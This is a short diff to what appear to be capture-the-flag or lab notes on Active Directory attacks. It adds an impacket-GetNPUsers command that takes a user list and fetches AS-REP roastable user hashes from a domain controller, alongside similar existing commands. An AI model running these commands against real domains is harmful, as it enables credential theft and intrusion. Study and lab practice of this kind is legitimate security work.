@@ -11,6 +11,10 @@ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161
 **will bring user hashes**
 
 ```sh
+impacket-GetNPUsers htb.local/ -usersfile sname.txt -dc-ip <IP>
+```
+
+```sh
 impacket-GetNPUsers joshi.local/ -dc-ip 192.168.1.100 -u user-Principal-Name-for-kerberoasting.txt
 ```
 
